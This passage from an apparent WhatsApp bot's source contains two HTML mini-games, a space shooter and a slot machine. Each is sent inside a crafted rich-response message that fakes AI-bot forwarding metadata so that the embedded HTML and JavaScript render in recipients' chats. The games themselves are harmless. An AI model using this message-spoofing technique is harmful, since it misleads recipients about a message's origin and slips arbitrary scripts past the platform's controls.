  var ROAD_L = 20, ROAD_R = W - 20;
  var laneCount = 4;
  var laneW = (ROAD_R - ROAD_L) / laneCount;
  var lanes = [];
  for (var li = 0; li < laneCount; li++) lanes.push(ROAD_L + laneW * (li + 0.5));
  var currentLane = 1;
  var targetX = lanes[currentLane];
  var playerX = lanes[currentLane];
  var playerY = H - 65;
  var score = 0;
  var best = 0;
  var kills = 0;
  var coinCount = 0;
  var combo = 1;
  var comboTimer = 0;
  var shake = 0;
  var flashAlpha = 0;
  try { best = parseInt(localStorage.getItem('plane_best_v1') || '0', 10) || 0; } catch(e){}
  bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');
  var bullets = [];
  var enemies = [];
  var coins = [];
  var particles = [];
  var stars = [];
  var gameOver = false;
  var shootTimer = 0;
  for (var s = 0; s < 40; s++) {
    stars.push({ x: Math.random() * W, y: Math.random() * H, size: Math.random() * 2 + 1, speed: Math.random() * 2 + 1 });
  }
  function spawnEnemy() {
    var laneIdx = Math.floor(Math.random() * laneCount);
    var isMeteor = Math.random() < 0.45;
    enemies.push({
      lane: laneIdx,
      x: lanes[laneIdx],
      y: -40,
      w: isMeteor ? 34 : 28,
      h: isMeteor ? 34 : 32,
      hp: isMeteor ? 999 : 1,
      isMeteor: isMeteor,
      speed: isMeteor ? 2.2 + Math.random() * 1.5 : 1.8 + Math.random() * 1.2
    });
  }
  function explode(x, y, color, count) {
    count = count || 20;
    for (var i = 0; i < count; i++) {
      var angle = Math.random() * Math.PI * 2;
      var spd = 1 + Math.random() * 5;
      particles.push({
        x: x, y: y,
        vx: Math.cos(angle) * spd,
        vy: Math.sin(angle) * spd,
        color: color,
        life: 1,
        size: 2 + Math.random() * 3
      });
    }
  }
  function drawSpaceCraft(x, y) {
    ctx.save();
    ctx.translate(x, y);
    var flameH = 12 + Math.random() * 8;
    var gradFlame = ctx.createLinearGradient(0, 15, 0, 15 + flameH);
    gradFlame.addColorStop(0, '#38bdf8');
    gradFlame.addColorStop(0.5, '#f59e0b');
    gradFlame.addColorStop(1, 'transparent');
    ctx.fillStyle = gradFlame;
    ctx.fillRect(-10, 15, 5, flameH);
    ctx.fillRect(5, 15, 5, flameH);
    ctx.fillStyle = '#1e3a8a';
    ctx.beginPath();
    ctx.moveTo(-12, 10);
    ctx.lineTo(-20, 18);
    ctx.lineTo(-8, 15);
    ctx.closePath();
    ctx.fill();
    ctx.beginPath();
    ctx.moveTo(12, 10);
    ctx.lineTo(20, 18);
    ctx.lineTo(8, 15);
    ctx.closePath();
    ctx.fill();
    ctx.fillStyle = '#2563eb';
    ctx.beginPath();
    ctx.moveTo(0, -10);
    ctx.lineTo(26, 12);
    ctx.lineTo(12, 14);
    ctx.lineTo(0, 8);
    ctx.lineTo(-12, 14);
    ctx.lineTo(-26, 12);
    ctx.closePath();
    ctx.fill();
    ctx.strokeStyle = '#60a5fa';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.moveTo(-26, 12);
    ctx.lineTo(0, -10);
    ctx.lineTo(26, 12);
    ctx.stroke();
    ctx.fillStyle = '#0284c7';
    ctx.fillRect(-12, 2, 4, 12);
    ctx.fillRect(8, 2, 4, 12);
    ctx.fillStyle = '#ef4444';
    ctx.fillRect(-25, 5, 2, 8);
    ctx.fillRect(23, 5, 2, 8);
    var gradBody = ctx.createLinearGradient(0, -28, 0, 16);
    gradBody.addColorStop(0, '#e0f2fe');
    gradBody.addColorStop(0.4, '#38bdf8');
    gradBody.addColorStop(1, '#1e40af');
    ctx.fillStyle = gradBody;
    ctx.beginPath();
    ctx.moveTo(0, -28);
    ctx.lineTo(7, -8);
    ctx.lineTo(6, 16);
    ctx.lineTo(-6, 16);
    ctx.lineTo(-7, -8);
    ctx.closePath();
    ctx.fill();
    ctx.fillStyle = '#06b6d4';
    ctx.beginPath();
    ctx.ellipse(0, -6, 3.5, 9, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = '#ffffff';
    ctx.beginPath();
    ctx.ellipse(-1, -8, 1, 3, Math.PI / 4, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();
  }
  function drawMeteor(x, y, size) {
    ctx.save();
    ctx.translate(x, y);
    ctx.fillStyle = '#78350f';
    ctx.strokeStyle = '#451a03';
    ctx.lineWidth = 2;
    ctx.beginPath();
    var points = 7;
    for (var i = 0; i < points; i++) {
      var angle = (i / points) * Math.PI * 2;
      var r = size / 2 + ((i % 2 === 0) ? 3 : -3);
      var px = Math.cos(angle) * r;
      var py = Math.sin(angle) * r;
      if (i === 0) ctx.moveTo(px, py); else ctx.lineTo(px, py);
    }
    ctx.closePath();
    ctx.fill();
    ctx.stroke();
    ctx.restore();
  }
  function drawAlien(x, y) {
    ctx.save();
    ctx.translate(x, y);
    ctx.fillStyle = '#10b981';
    ctx.beginPath();
    ctx.arc(0, 0, 12, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = '#059669';
    ctx.fillRect(-14, 2, 28, 5);
    ctx.fillStyle = '#ffffff';
    ctx.fillRect(-5, -4, 4, 4);
    ctx.fillRect(1, -4, 4, 4);
    ctx.restore();
  }
  var spawnCounter = 0;
  function update() {
    ctx.save();
    if (shake > 0) {
      var sx = (Math.random() - 0.5) * shake;
      var sy = (Math.random() - 0.5) * shake;
      ctx.translate(sx, sy);
      shake *= 0.88;
      if (shake < 0.5) shake = 0;
    }
    ctx.clearRect(-10, -10, W + 20, H + 20);
    ctx.fillStyle = '#ffffff';
    for (var s = 0; s < stars.length; s++) {
      var st = stars[s];
      if (!gameOver) st.y = (st.y + st.speed) % H;
      ctx.globalAlpha = Math.random() * 0.5 + 0.5;
      ctx.fillRect(st.x, st.y, st.size, st.size);
    }
    ctx.globalAlpha = 1;
    if (!gameOver) {
      playerX += (targetX - playerX) * 0.25;
      shootTimer++;
      if (shootTimer >= 10) {
        bullets.push({ x: playerX - 12, y: playerY - 10, speed: 8 });
        bullets.push({ x: playerX + 12, y: playerY - 10, speed: 8 });
        shootTimer = 0;
      }
      spawnCounter++;
      if (spawnCounter > 35) {
        spawnEnemy();
        spawnCounter = 0;
      }
      if (comboTimer > 0) comboTimer--; else if (combo > 1) combo = 1;
    }
    ctx.fillStyle = '#38bdf8';
    for (var b = bullets.length - 1; b >= 0; b--) {
      var bl = bullets[b];
      if (!gameOver) bl.y -= bl.speed;
      ctx.fillRect(bl.x - 1.5, bl.y, 3, 10);
      if (bl.y < -10) bullets.splice(b, 1);
    }
    for (var e = enemies.length - 1; e >= 0; e--) {
      var en = enemies[e];
      if (!gameOver) en.y += en.speed;
      if (en.isMeteor) {
        drawMeteor(en.x, en.y, en.w);
      } else {
        drawAlien(en.x, en.y);
      }
      for (var b = bullets.length - 1; b >= 0; b--) {
        var bl = bullets[b];
        if (Math.abs(bl.x - en.x) < en.w / 2 + 2 && Math.abs(bl.y - en.y) < en.h / 2 + 5) {
          bullets.splice(b, 1);
          en.hp--;
          explode(bl.x, bl.y, en.isMeteor ? '#78350f' : '#10b981', 6);
          if (en.hp <= 0) {
            kills++;
            score += 50 * combo;
            combo = Math.min(combo + 1, 9);
            comboTimer = 90;
            coins.push({ x: en.x, y: en.y, r: 8, spin: 0 });
            explode(en.x, en.y, '#10b981', 15);
            enemies.splice(e, 1);
            break;
          }
        }
      }
      if (!en) continue;
      if (!gameOver && Math.abs(playerX - en.x) < 22 && Math.abs(playerY - en.y) < 22) {
        gameOver = true;
        shake = 12;
        flashAlpha = 0.5;
        explode(playerX, playerY, '#3b82f6', 25);
        explode(en.x, en.y, en.isMeteor ? '#78350f' : '#10b981', 25);
      }
      if (en.y > H + 40) enemies.splice(e, 1);
    }
    for (var c = coins.length - 1; c >= 0; c--) {
      var cn = coins[c];
      if (!gameOver) { cn.y += 2.5; cn.spin += 0.15; }
      var squash = Math.abs(Math.cos(cn.spin));
      ctx.save();
      ctx.translate(cn.x, cn.y);
      ctx.scale(Math.max(0.2, squash), 1);
      ctx.fillStyle = '#fbbf24';
      ctx.beginPath();
      ctx.arc(0, 0, cn.r, 0, Math.PI * 2);
      ctx.fill();
      ctx.restore();
      if (!gameOver && Math.abs(playerX - cn.x) < 20 && Math.abs(playerY - cn.y) < 20) {
        coinCount++;
        score += 30;
        explode(cn.x, cn.y, '#fbbf24', 8);
        coins.splice(c, 1);
      } else if (cn.y > H + 20) {
        coins.splice(c, 1);
      }
    }
    if (!gameOver) {
      drawSpaceCraft(playerX, playerY);
    }
    for (var p = particles.length - 1; p >= 0; p--) {
      var pt = particles[p];
      pt.x += pt.vx;
      pt.y += pt.vy;
      pt.life -= 0.05;
      if (pt.life <= 0) { particles.splice(p, 1); continue; }
      ctx.globalAlpha = Math.max(pt.life, 0);
      ctx.fillStyle = pt.color;
      ctx.beginPath();
      ctx.arc(pt.x, pt.y, pt.size, 0, Math.PI * 2);
      ctx.fill();
      ctx.globalAlpha = 1;
    }
    if (flashAlpha > 0.01) {
      ctx.fillStyle = 'rgba(255,255,255,' + flashAlpha + ')';
      ctx.fillRect(0, 0, W, H);
      flashAlpha *= 0.85;
    }
    scoreEl.textContent = String(score).padStart(4, '0');
    if (score > best) {
      best = score;
      try { localStorage.setItem('plane_best_v1', String(best)); } catch(e){}
      bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');
    }
    killsStatEl.textContent = kills;
    comboStatEl.textContent = 'x' + combo;
    coinsStatEl.textContent = coinCount;
    if (gameOver) {
      ctx.fillStyle = 'rgba(7, 10, 18, 0.85)';
      ctx.fillRect(0, 0, W, H);
      ctx.textAlign = 'center';
      ctx.fillStyle = '#ef4444';
      ctx.font = '900 24px sans-serif';
      ctx.fillText('DESTROYED 💥', W / 2, H / 2 - 25);
      ctx.fillStyle = '#ffffff';
      ctx.font = '800 14px sans-serif';
      ctx.fillText('Score: ' + score, W / 2, H / 2 - 2);
      ctx.fillStyle = '#94a3b8';
      ctx.font = '600 11px sans-serif';
      ctx.fillText('Kills: ' + kills + '  •  Coins: ' + coinCount, W / 2, H / 2 + 18);
      ctx.fillStyle = '#38bdf8';
      ctx.font = '700 12px sans-serif';
      ctx.fillText('TAP TO RESTART', W / 2, H / 2 + 42);
    }
    ctx.restore();
    requestAnimationFrame(update);
  }
  function moveLeft() {
    if (gameOver) return;
    if (currentLane > 0) currentLane--;
    targetX = lanes[currentLane];
  }
  function moveRight() {
    if (gameOver) return;
    if (currentLane < lanes.length - 1) currentLane++;
    targetX = lanes[currentLane];
  }
  function restart() {
    score = 0;
    kills = 0;
    coinCount = 0;
    combo = 1;
    comboTimer = 0;
    bullets = [];
    enemies = [];
    coins = [];
    particles = [];
    currentLane = 1;
    targetX = lanes[currentLane];
    playerX = lanes[currentLane];
    gameOver = false;
  }
  function addTapEvent(id, fn) {
    var el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('pointerdown', function(e) { e.preventDefault(); fn(); });
  }
  addTapEvent('leftBtn', moveLeft);
  addTapEvent('rightBtn', moveRight);
  function handleCanvasTap(e) {
    e.preventDefault();
    if (gameOver) { restart(); return; }
    var rect = cvs.getBoundingClientRect();
    var clientX = e.clientX;
    if (e.touches && e.touches.length > 0) clientX = e.touches[0].clientX;
    var clickX = (clientX - rect.left) * (W / rect.width);
    if (clickX < W / 2) moveLeft(); else moveRight();
  }
  cvs.addEventListener('pointerdown', handleCanvasTap);
  update();
})();
</script>
</body>
</html>
`;
          const data = {
            response_id: "PopiooNixelPopiooNixelPopiooNixel",
            sections: [{
              __typename: "GenAIUnifiedResponseSection",
              view_model: {
                __typename: "GenAISingleLayoutViewModel",
                primitive: {
                  __typename: "GenAIBotProgressStatusPrimitive",
                  title: "click this text",
                  is_in_progress: true
                }
              }
            }],
            embedded_screens: [{
              title: "Preview",
              content: [{
                __typename: "FOAIDNixelButtonSheets",
                tabs: [{
                  id: "tab_0",
                  tab_header: "Akoya-MD",
                  sections: [{
                    __typename: "GenAIUnifiedResponseSection",
                    view_model: {
                      __typename: "GenAISingleLayoutViewModel",
                      primitive: {
                        __typename: "GenAIaeacdsnwHtmlPrimitive",
                        payload: html,
                        url: "https://example.com",
                        trusted_sources: ["example.com"]
                      }
                    }
                  }],
                  step_entries: []
                }]
              }]
            }]
          };
          await client.relayMessage(m.chat, {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              botMetadata: {
                messageDisclaimerText: "",
                richResponseSourcesMetadata: {}
              }
            },
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  unifiedResponse: {
                    data: Buffer.from(JSON.stringify(data)).toString('base64')
                  },
                  contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedAiBotMessageInfo: {
                      botJid: "0@bot"
                    },
                    forwardOrigin: 4
                  }
                }
              }
            }
          }, {
            messageId: await client.generateMessageTag()
          });
        }
        break;
      case "slot777":
        {
          const html = `<style>
*{box-sizing:border-box;margin:0;font-family:'Segoe UI',Arial,sans-serif;user-select:none;-webkit-user-select:none;-webkit-tap-highlight-color:transparent}
html,body{width:100%}
body{background:radial-gradient(circle at 50% 8%,#1d6a50,#0f4938 48%,#07291f);padding:9px;color:#e9e3bc;overflow-y:auto}
.machine{width:100%;max-width:420px;margin:0 auto;position:relative;padding:10px 12px 12px;border:4px solid #b9954d;border-radius:26px;background:linear-gradient(110deg,#061e17,#1b644b 12%,#0b382a 30%,#15543f 55%,#092f24 80%,#28775a 94%,#071f18);box-shadow:inset 0 0 0 3px #163f31,inset 0 16px 26px #73d2a31f,0 8px 0 #041a13,0 16px 24px #000c}
.lights{height:9px;margin:0 12px 7px;border:2px solid #123d2f;border-radius:8px;background:repeating-radial-gradient(circle at 6px 50%,#dfffdc 0 2px,#82c878 3px 5px,#164936 6px 12px);box-shadow:0 0 12px #67b881;animation:blink.55s steps(2) infinite}
.title{padding:10px 4px 8px;border:3px solid #b99a54;border-radius:16px 16px 11px 11px;color:#e9e3bc;background:radial-gradient(ellipse at 50% 0,#2b8a6c,#11513f 60%,#082a24);text-align:center;font:900 25px Impact,'Arial Black',sans-serif;letter-spacing:1px;text-shadow:0 3px #193f31,0 0 12px #7ddc8a66}
.jack{width:76%;margin:6px auto;padding:3px;border:2px solid #a98c4d;border-radius:9px;color:#ded7ad;background:linear-gradient(#245d48,#0b3025);text-align:center;font:bold 10px monospace;letter-spacing:1px}
.stats{display:flex;margin:0 2px 8px;padding:5px;border:2px solid #537d64;border-radius:9px;background:linear-gradient(#102d24,#061812);box-shadow:inset 0 0 9px #000}
.stats div{flex:1;border-right:1px solid #416452;text-align:center;font:bold 10px monospace;color:#91b59f}
.stats div:last-child{border:0}
.stats b{display:block;margin-top:2px;font-size:15px;color:#e3dfbb;text-shadow:0 0 6px #62a77d}
.frame{padding:8px;border:4px solid #315c47;border-radius:16px;background:linear-gradient(90deg,#09271e,#b49a59 5%,#174936 10%,#174936 90%,#b49a59 95%,#09271e);box-shadow:inset 0 0 0 3px #071b15,0 4px 0 #09271e,0 8px 15px #000a}
#reels{display:grid;grid-template-columns:repeat(5,1fr);height:192px;overflow:hidden;border:3px solid #071c15;border-radius:10px;background:#071a14;box-shadow:inset 0 12px 18px #0009,inset 0 -12px 18px #0009}
.reel{position:relative;overflow:hidden;background:linear-gradient(90deg,#8f6a39,#fff8d8 17%,#fffdf0 50%,#f0dfad 82%,#79552c);box-shadow:inset 7px 0 8px #573b1d55,inset -7px 0 8px #573b1d55}
.reel+.reel{border-left:2px solid #573512}
.reel:after{content:"";position:absolute;inset:0;pointer-events:none;background:linear-gradient(#1c0d05bb 0,transparent 18%,transparent 80%,#281208cc 100%)}
.strip{will-change:transform}
.strip.moving{filter:blur(1.4px) saturate(1.2)}
.sym{height:64px;display:flex;align-items:center;justify-content:center;border-bottom:1px solid #9f7e4f44;font-family:'Apple Color Emoji','Segoe UI Emoji',sans-serif;font-size:40px;line-height:1;text-shadow:0 3px 0 #72101822,0 0 4px #fff}
.s7{font:900 42px Impact,'Arial Black',sans-serif;color:#ef1726;-webkit-text-stroke:2px #850815;text-shadow:0 3px #5d0509,0 0 5px #fff}
.sbar{width:52px;height:22px;display:flex;align-items:center;justify-content:center;font:900 12px 'Arial Black',sans-serif;color:#fff4c4;background:radial-gradient(ellipse at center,#e22d35 0,#6f0910 55%,transparent 56%);text-shadow:0 2px #401010}
.win{animation:winP.5s ease-in-out infinite;background:radial-gradient(circle,#fff8a9,#ffae00 55%,transparent 72%)}
@keyframes winP{50%{transform:scale(1.09);filter:brightness(1.4)}}
.message{height:34px;margin:9px 2px 7px;display:flex;align-items:center;justify-content:center;border:2px solid #537d64;border-radius:8px;background:linear-gradient(#102d24,#061812);box-shadow:inset 0 0 8px #000;color:#e3dfbb;font:bold 14px monospace;text-shadow:0 0 7px #62a77d;text-align:center}
.console{display:grid;grid-template-columns:46px 1fr 1.8fr;gap:8px;margin:0 3px;padding:9px 8px 11px;border:3px solid #416a53;border-radius:9px 9px 16px 16px;background:linear-gradient(#9c8c59,#315d48 37%,#0a2e22 39%,#123e2f);box-shadow:inset 0 2px #d9c992,0 6px #061d16,0 12px 18px #0009}
button{height:53px;border:3px solid #0b2e22;border-radius:13px;color:#fff;font-weight:900;cursor:pointer;touch-action:manipulation}
.mute{background:linear-gradient(#d9b04a,#8a6d08 55%,#5d4805);box-shadow:0 4px #3d2f02;font-size:18px}
.bet{background:linear-gradient(#4f9a77,#216348 53%,#103d2d);box-shadow:inset 0 4px 4px #d8ffe055,0 4px #092a20}
.spin{background:radial-gradient(circle at 50% 32%,#a8d96f,#4b8d46 47%,#1e542f 76%);box-shadow:inset 0 4px 5px #e8ffd488,0 4px #12351e,0 0 14px #79b85c88;font-size:18px;text-shadow:0 2px #06420d}
button:disabled{filter:saturate(.4) brightness(.75)}
.tray{width:48%;height:17px;margin:13px auto 0;border:4px solid #244d3a;border-radius:4px 4px 10px 10px;background:#061a13;box-shadow:inset 0 6px 9px #000,0 3px #897945}
.winner.lights{animation-duration:.16s}
.winner.title{animation:winP.6s ease-in-out 2}
.over{position:absolute;inset:0;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:7px;border-radius:20px;background:#03150eec;color:#ffe5a0;text-align:center}
.over.off{display:none}
.over h2{margin:0 0 6px;font-size:24px;color:#ff3449;text-shadow:0 0 12px #f00}
.over p{font-size:13px;color:#cfe6c8}
.over button{padding:0 22px;height:40px;background:#ffd15a;color:#271204}
@keyframes blink{50%{filter:brightness(1.7)}}
</style>
<div class="machine" id="machine">
<div class="lights"></div>
<div class="title">FRUIT BONANZA</div>
<div class="jack">JACKPOT · 10.000 CREDITS</div>
<div class="stats"><div>CREDITS<b id="credits">500</b></div><div>BET<b id="betValue">10</b></div><div>BEST WIN<b id="best">0</b></div></div>
<div class="frame"><div id="reels"></div></div>
<div id="message" class="message">SPIN to START</div>
<div class="console"><button id="mute" class="mute">🔊</button><button id="bet" class="bet">BET +</button><button id="spin" class="spin">🎰 SPIN</button></div>
<div class="tray"></div>
<div id="over" class="over off"><h2>GAME OVER</h2><p>Credits habis!<br>Best Win: <b id="finalBest">0</b></p><button id="restart">PLAY AGAIN</button></div>
</div>
<script>
(function(){
var AC=null,MUTED=false;
try{MUTED=localStorage.getItem('slot_mute')==='1'}catch(e){}
function ac(){if(!AC){try{AC=new(window.AudioContext||window.webkitAudioContext)()}catch(e){return null}}if(AC.state==='suspended'){try{AC.resume()}catch(e){}}return AC;}
function tone(f,dur,type,vol,delay,slide){var a=ac();if(!a||MUTED)return;try{var t=a.currentTime+(delay||0),o=a.createOscillator(),g=a.createGain();o.type=type||'square';o.frequency.setValueAtTime(f,t);if(slide)o.frequency.exponentialRampToValueAtTime(slide,t+dur);g.gain.setValueAtTime(vol||.12,t);g.gain.exponentialRampToValueAtTime(.0001,t+dur);o.connect(g);g.connect(a.destination);o.start(t);o.stop(t+dur+.03);}catch(e){}}
function sndClick(){tone(650,.05,'square',.08)}
function sndSpin(){tone(700,.28,'sawtooth',.06,0,150);for(var i=0;i<8;i++)tone(170,.03,'square',.05,.1+i*.1)}
function sndStop(c){tone(150+c*35,.09,'square',.16)}
function sndWin(){[660,880,1100].forEach(function(f,i){tone(f,.14,'triangle',.14,i*.09)})}
function sndJackpot(){[523,659,784,1046,784,1046,1318,1568].forEach(function(f,i){tone(f,.16,'square',.12,i*.11);tone(f/2,.16,'triangle',.08,i*.11)})}
function sndLose(){tone(220,.2,'sawtooth',.07);tone(160,.3,'sawtooth',.07,.14)}
function sndOver(){[392,330,262,196].forEach(function(f,i){tone(f,.3,'triangle',.12,i*.28)})}
document.addEventListener('pointerdown',function(){ac()},{once:true});
var SY=['🍒','🍋','🔔','💎','7','BAR'],WT=[30,25,18,12,8,7],PAY=[2,3,5,8,12,20],SH=64,LEN=10,OFF=7,credits=500,bet=10,best=0,busy=false,reels=[],C=document.getElementById('credits'),BV=document.getElementById('betValue'),BS=document.getElementById('best'),MSG=document.getElementById('message'),SP=document.getElementById('spin'),BT=document.getElementById('bet'),MUB=document.getElementById('mute'),OV=document.getElementById('over'),FB=document.getElementById('finalBest'),MCH=document.getElementById('machine');
function pick(){var n=Math.random()*100,s=0;for(var i=0;i<6;i++){s+=WT[i];if(n<s)return i}return 0}
function symHTML(v){return '<div class="sym">'+(v===4?'<i class="s7">7</i>':v===5?'<i class="sbar">BAR</i>':SY[v])+'</div>'}
function ui(){C.textContent=credits;BV.textContent=bet;BS.textContent=best}
function msg(t){MSG.textContent=t}
function clearWin(){for(var c=0;c<5;c++)for(var i=OFF;i<LEN;i++)reels[c].strip.children[i].classList.remove('win')}
function spin(){if(busy||credits<bet)return;busy=true;clearWin();credits-=bet;ui();SP.disabled=true;BT.disabled=true;msg('GOOD LUCK ✨');sndSpin();for(var c=0;c<5;c++){var r=reels[c],vals=[],h='';for(var i=0;i<LEN;i++)vals.push(pick());for(var j=0;j<LEN;j++)h+=symHTML(vals[j]);r.vals=vals;r.strip.innerHTML=h;r.strip.style.transition='none';r.strip.style.transform='translateY(0)';r.strip.offsetHeight;var dur=1.05+c*0.22;r.strip.classList.add('moving');r.strip.style.transition='transform '+dur+'s cubic-bezier(.12,.75,.25,1)';r.strip.style.transform='translateY(-'+(OFF*SH)+'px)';(function(st,d,ix){setTimeout(function(){st.classList.remove('moving');sndStop(ix)},d*1000)})(r.strip,dur,c)}setTimeout(evalBoard,2150)}
function evalBoard(){var grid=[];for(var c=0;c<5;c++)grid.push(reels[c].vals.slice(OFF));var lines=[[0,0,0,0,0],[1,1,1,1,1],[2,2,2,2,2],[0,1,2,1,0],[2,1,0,1,2]],total=0,wc=[];lines.forEach(function(p){var a=grid[0][p[0]],n=1;for(var x=1;x<5&&grid[x][p[x]]===a;x++)n++;if(n>=3){total+=Math.floor(bet*PAY[a]*(n===3?1:n===4?2:5));for(var i=0;i<n;i++)wc.push([i,p[i]])}});if(total){credits+=total;best=Math.max(best,total);wc.forEach(function(w){reels[w[0]].strip.children[OFF+w[1]].classList.add('win')});msg(total>=bet*20?'🎰 JACKPOT +'+total:'✨ WIN +'+total);MCH.classList.add('winner');setTimeout(function(){MCH.classList.remove('winner')},1800);if(total>=bet*20)sndJackpot();else sndWin()}else{msg('💦 not yet HOKI!');sndLose()}SP.disabled=false;BT.disabled=false;busy=false;ui();if(credits<10)setTimeout(gameover,900);else if(bet>credits){bet=10;ui()}}
function gameover(){FB.textContent=best;OV.className='over';sndOver()}
BT.onclick=function(){if(busy)return;sndClick();bet=bet===10?20:bet===20?50:10;if(bet>credits)bet=10;ui()};SP.onclick=spin;MUB.onclick=function(){MUTED=!MUTED;MUB.textContent=MUTED?'🔇':'🔊';try{localStorage.setItem('slot_mute',MUTED?'1':'0')}catch(e){}if(!MUTED)sndClick()};if(MUTED)MUB.textContent='🔇';
document.getElementById('restart').onclick=function(){sndClick();credits=500;bet=10;best=0;busy=false;OV.className='over off';msg('SPIN to START');SP.disabled=false;BT.disabled=false;clearWin();ui()};
var box=document.getElementById('reels');for(var c=0;c<5;c++){var d=document.createElement('div');d.className='reel';var s=document.createElement('div');s.className='strip';d.appendChild(s);box.appendChild(d);var h='';for(var i=0;i<LEN;i++)h+=symHTML(pick());s.innerHTML=h;s.style.transform='translateY(-'+(OFF*SH)+'px)';reels.push({strip:s,vals:[0,0,0]})}ui();
})();

/* RIMURU LIGHT SFX: procedural WebAudio, no external audio asset */
(function(){
 if (window.__RIMURU_LIGHT_SFX__) return;
 var ac=null, master=null, last=0;
 function init(){
 try{
 if(!ac){
 var C=window.AudioContext||window.webkitAudioContext;
 if(!C) return null;
 ac=new C();
 master=ac.createGain();
 master.gain.value=0.055;
 master.connect(ac.destination);
 }
 if(ac.state==='suspended') ac.resume();
 return ac;
 }catch(_){ return null; }
 }
 function tone(freq,dur,type,vol,when){
 var c=init(); if(!c||!master) return;
 var now=c.currentTime+(when||0), o=c.createOscillator(), g=c.createGain();
 o.type=type||'sine';
 o.frequency.setValueAtTime(freq,now);
 g.gain.setValueAtTime(0.0001,now);
 g.gain.exponentialRampToValueAtTime(Math.max(0.0001,vol||0.12),now+0.008);
 g.gain.exponentialRampToValueAtTime(0.0001,now+(dur||0.07));
 o.connect(g); g.connect(master); o.start(now); o.stop(now+(dur||0.07)+0.015);
 }
 function cool(now){
 var t=Date.now(); if(t-last<now) return false; last=t; return true;
 }
 var api={
 init:init,
 tap:function(){ if(cool(28)) tone(520,0.045,'square',0.055); },
 move:function(){ if(cool(24)) tone(300,0.035,'triangle',0.045); },
 rotate:function(){ if(cool(24)) tone(430,0.05,'triangle',0.05); },
 drop:function(){ if(cool(20)) tone(180,0.055,'square',0.05); },
 score:function(){ if(cool(18)) { tone(660,0.055,'sine',0.055); tone(880,0.055,'sine',0.04,0.045); } },
 line:function(){ if(cool(35)) { tone(740,0.06,'sine',0.06); tone(1040,0.09,'sine',0.045,0.05); } },
 win:function(){ if(cool(60)) { tone(523,0.08,'sine',0.06); tone(659,0.08,'sine',0.05,0.07); tone(784,0.12,'sine',0.045,0.14); } },
 over:function(){ if(cool(60)) { tone(392,0.09,'sawtooth',0.055); tone(294,0.12,'sawtooth',0.04,0.08); } }
 };
 window.__RIMURU_LIGHT_SFX__=api;

 function num(el){
 var s=(el.textContent||'').replace(/,/g,'').match(/-?d+(?:.d+)?/);
 return s?Number(s[0]):null;
 }
 function bindValue(el){
 var lastVal=num(el);
 var mo=new MutationObserver(function(){
 var n=num(el);
 if(n===null || lastVal===null){ lastVal=n; return; }
 if(n>lastVal){
 var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
 if(/line|combo|clear|level|stage/.test(id)) api.line(); else api.score();
 } else if(n<lastVal && /life|hp|health|lives|heart/.test(((el.id||'')+' '+(el.className||'')).toLowerCase())) api.over();
 lastVal=n;
 });
 mo.observe(el,{subtree:true,childList:true,characterData:true});
 }
 function bindState(el){
 var prev=(el.textContent||'').toLowerCase(), prevCls=el.className||'';
 var mo=new MutationObserver(function(){
 var txt=(el.textContent||'').toLowerCase(), cls=el.className||'';
 var joined=txt+' '+cls.toLowerCase();
 if(joined!==prev+' '+prevCls.toLowerCase()){
 if(/game over|gameover|kalah|done|you lose|lose|off|failed|over/.test(joined)) api.over();
 else if(/menang|menang!|you win|winner|victory|success|selamat/.test(joined)) api.win();
 prev=txt; prevCls=cls;
 }
 });
 mo.observe(el,{subtree:true,childList:true,characterData:true,attributes:true,attributeFilter:['class','style','hidden','aria-hidden']});
 }
 document.addEventListener('pointerdown',function(){ api.init(); api.tap(); },{passive:true,capture:true});
 document.addEventListener('keydown',function(e){
 api.init();
 var k=e.key;
 if(/^Arrow(Left|Right|Up|Down)$/.test(k) || /^(a|d|w|s)$/i.test(k)) api.move();
 else if(k===' ' || k==='Enter') api.tap();
 },{passive:true,capture:true});
 document.addEventListener('DOMContentLoaded',function(){
 document.querySelectorAll('[id]').forEach(function(el){
 var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
 if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
 if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
 });
 });
 if(document.readyState!=='loading'){
 document.querySelectorAll('[id]').forEach(function(el){
 var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
 if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
 if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
 });
 }
})();
</script>`;
          const data = {
            response_id: "PopiooNixelPopiooNixelPopiooNixel",
            sections: [{
              __typename: "GenAIUnifiedResponseSection",
              view_model: {
                __typename: "GenAISingleLayoutViewModel",
                primitive: {
                  __typename: "GenAIBotProgressStatusPrimitive",
                  title: "click this text",
                  is_in_progress: true
                }
              }
            }],
            embedded_screens: [{
              title: "Preview",
              content: [{
                __typename: "FOAIDNixelButtonSheets",
                tabs: [{
                  id: "tab_0",
                  tab_header: "Akoya-MD",
                  sections: [{
                    __typename: "GenAIUnifiedResponseSection",
                    view_model: {
                      __typename: "GenAISingleLayoutViewModel",
                      primitive: {
                        __typename: "GenAIaeacdsnwHtmlPrimitive",
                        payload: html,
                        url: "https://example.com",
                        trusted_sources: ["example.com"]
                      }
                    }
                  }],
                  step_entries: []
                }]
              }]
            }]
          };
          await client.relayMessage(m.chat, {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              botMetadata: {
                messageDisclaimerText: "",
                richResponseSourcesMetadata: {}
              }
            },
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  unifiedResponse: {
                    data: Buffer.from(JSON.stringify(data)).toString('base64')
                  },
                  contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedAiBotMessageInfo: {
                      botJid: "0@bot"
                    },
                    forwardOrigin: 4
                  }
                }
              }
            }
          }, {
            messageId: await client.generateMessageTag()
          });
